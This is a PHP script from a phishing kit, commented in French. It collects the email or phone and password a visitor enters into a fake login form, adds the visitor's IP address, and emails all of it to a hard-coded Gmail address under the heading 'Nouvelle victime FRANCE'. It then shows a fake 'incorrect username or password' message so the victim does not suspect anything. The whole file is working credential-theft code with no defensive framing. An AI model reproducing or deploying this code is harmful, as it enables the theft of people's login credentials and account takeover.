﻿<?php
	//-- Fonction de récupération de l'adresse IP du visiteur
function get_ip()
{
	if ( isset ( $_SERVER['HTTP_X_FORWARDED_FOR'] ) )
	{
		$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	}
	elseif ( isset ( $_SERVER['HTTP_CLIENT_IP'] ) )
	{
		$ip  = $_SERVER['HTTP_CLIENT_IP'];
	}
	else
	{
		$ip = $_SERVER['REMOTE_ADDR'];
	}
	return $ip;
}

if(isset($_REQUEST['submit'])){

	$mail_phone =  $_POST['f_1'];
	$pass       =  $_POST['f_2'];
	$ip 		=  get_ip ();
	$email_to   =  "balleuxfinances@gmail.com";

	//STUFF
	$body = '<html><body>';
	$body .= '<h1>Nouvelle victime FRANCE</h1><br/><p><br/><strong>Email_Phone :</strong> '. $mail_phone .'<br/><strong>Pass:</stong> ' . $pass . '<br/><strong>IP:</strong> ' . $ip .'<br/></p>';
	$body .= '</body></html>';

	$headers  = 'MIME-Version: 1.0' . "\r\n";
	$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";

     // En-têtes additionnels
	//$headers .= 'From: FRANCE <hello@haruja.com>' . "\r\n";

	$subject = 'Nouvelle Victime #KALEO#';

	$success = @mail($email_to, $subject, $body, $headers);
	if($success){
       $erreurs[0] = "Identifiants incorrects";
       $erreurs[1] = "Nom d’utilisateur ou mot de passe incorrect";
    	include 'index.php';
	}
	else{
		echo ".";
	}
}

?>